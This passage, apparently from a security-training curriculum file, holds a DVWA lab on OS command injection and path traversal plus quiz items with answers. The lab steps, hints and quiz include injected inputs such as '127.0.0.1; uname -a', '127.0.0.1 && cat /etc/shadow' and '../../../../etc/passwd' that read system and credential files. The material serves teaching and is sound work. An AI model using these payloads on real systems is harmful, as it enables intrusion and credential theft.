3. Run: \`127.0.0.1; uname -a\` → what OS and kernel version?
4. Run: \`127.0.0.1; ls /var/www/html/dvwa/includes/\` → list config files
5. Run: \`127.0.0.1; cat /var/www/html/dvwa/includes/dvwaPage.inc.php | head -30\` → read source
6. Screenshot of each result

**Part 2 — Path Traversal:**
1. DVWA → File Inclusion
2. In the URL, change \`?page=include.php\` to \`?page=../../../../etc/passwd\`
3. Screenshot showing the contents of /etc/passwd

**Part 3 — Analysis:**
Answer in AI chat:
- What database credentials can you find in DVWA config files?
- What user is the web server running as? Is this following least-privilege?
- Why is "nobody" or "www-data" a better user than "root" for a web server?`,
          hints: [
            'The DVWA config file is at /var/www/html/dvwa/config/config.inc.php — try to read it with cat',
            'If semicolon doesn\'t work, try the pipe character: 127.0.0.1 | id',
            'Path traversal: start with ../../../../ and adjust the number of ../ until you reach the filesystem root'
          ]
        },
        quiz: [
          {
            type: 'mcq',
            q: 'An attacker inputs `127.0.0.1 && cat /etc/shadow` into a ping form. The `&&` operator means:',
            options: [
              'The cat command runs regardless of whether ping succeeds',
              'The cat command only runs if ping succeeds first',
              'Both commands run in parallel',
              'The && is treated as a literal string, not an operator'
            ],
            answer: 1
          },
          {
            type: 'mcq',
            q: 'Why is path traversal with `../../../../etc/passwd` more dangerous than just reading `/etc/passwd` directly?',
            options: [
              'There is no difference — both do the same thing',
              'The `../` sequences navigate up from the web directory to the filesystem root, bypassing the web server\'s file access restrictions',
              'Path traversal also executes the file content as code',
              '`../../../../` URL-encodes the path to avoid detection'
            ],
            answer: 1
          },
          {
            type: 'truefalse',
            q: 'Using ProcessBuilder with a list of arguments (rather than a single command string) prevents OS command injection because the shell never interprets the arguments.',
            answer: true
          },
          {
            type: 'fillin',
            q: 'In path traversal attacks, the sequence _______ navigates up one directory level in both Linux and Windows file systems.',
            answer: '../'
          }
        ]
      }
    ]
  }

]; // Modules 3-4 added by security-curriculum-advanced.js
